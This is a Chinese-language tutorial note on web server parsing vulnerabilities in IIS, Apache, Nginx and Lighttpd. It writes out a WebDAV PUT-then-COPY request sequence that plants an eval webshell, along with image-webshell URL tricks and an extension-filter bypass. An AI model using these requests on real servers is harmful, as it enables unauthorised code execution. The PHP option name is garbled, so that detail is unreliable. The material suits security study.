# Web Server 解析漏洞

## IIS
### IIS 6.0 解析漏洞

- 若建立一个后缀名为*.asa, *.asp的文件夹时，其目录下的任意文件均被IIS 6.0 server视为asp文件进行解析。

例如：创建一个名为a.asp的目录，其中有文本文件123.txt，文本内容为`<%=NOW()%>`，IIS解析时会将其作为asp函数执行，返回当前时间。

- WebDav服务漏洞。开启该服务后会扩展http协议，如果选择支持PUT, Move, Copy, Delete等HTTP方法，就会引入安全漏洞，攻击者可以通过PUT方法向server上传危险脚本。

例如：

先通过OPTIONS 方法探测服务器支持的http方法：
```http
OPTIONS / HTTP/1.1
Host: www.secbug.org
```

响应如下：
```
HTTP/1.1 200 OK
Cache-control:private
Date: Mon, 19 Aug 2013 09:41:45 GMT
Allow: OPTIONS, TRACE, GET,HEAD,DELETE,COPY,MOVE,PROPFIND,PROPPATCH,SEARH,...
...
```
然后，通过PUT方法向服务器上传脚本
```
PUT \1.TXT HTTP/1.1
HOST:WWW.SEEBUG.ORG

<%eval request("chopper")%>
```

然后通过COPY 或 MOVE方法改名
```
COPY /1.txt HTTP/1.1
HOST:www.seebug.org
Destination:http://www.secbug.org/cmd.asp
```

这样就获取了一个webshell cmd.asp

安全前辈桂林老兵、zwell都写过针对WebDaV漏洞的工具（IIS Write、IIS PUT/scanner。



### IIS 7.0 7.5 
例如：访问 `http://www.xxser.com/1.jpg/1.asp` 此时1.jpg会被当做 asp脚本执行。这其中 1.asp并不存在，但仍可以执行 asp 脚本。原因是 1.jpg中包含了恶意脚本（图片马），然后在url中输入 xx.asp即可执行。

## Apache 解析漏洞

### Apache 1.x 2.x 解析漏洞

上述版本的Apache，在解析未知扩展名的文档时，会从后向前解析，直到遇到已知的扩展名，并按其加载解析方法；如果没有已知的扩展名，则报错，暴露源代码。

Apache中已知的扩展名，被设置在 `/conf/mime.types`文件中。

在这两类版本中，如果有一个1.php.rar文件，内容为:

```php
<?php
    phpinfo();
?>
```

通过http访问该文件时，将显示phpinfo()函数执行结果，而不是下载rar文件提升框。


一些开发者使用规则匹配 .php , .asp , .jsp , .aspx ,.asa , .cer 等后缀名方法，过滤掉不应接受的脚本，但若apache有上述解析漏洞，攻击者构造 1.php.any_char 就可绕过检查。

## Nginx 解析漏洞

例如：访问 `http://www.xxser.com/1.jpg/1.php` 此时1.jpg会被当做 php脚本执行。这其中 1.php并不存在，但仍可以执行 php 脚本。原因是 1.jpg中包含了恶意脚本（图片马），然后在url中输入 xx.php即可执行。

这个漏洞实际为 PHP CGI 漏洞：
- 在PHP的配置文件中有一个关键的选项：`cgi.fi: x_pathinfo` 。这个选项在某些版本中是默认开启的，在开启时访问如上述`http://www.xxser.com/1.jpg/1.php` 类似的URL，PHP将会向前递归解析，于是造成了解析漏洞。

## Lighttpd 解析漏洞

例如：访问 `http://www.xxser.com/1.jpg/1.php` 此时1.jpg会被当做 php脚本执行。这其中 1.php并不存在，但仍可以执行 php 脚本。原因是 1.jpg中包含了恶意脚本（图片马），然后在url中输入 xx.php即可执行。
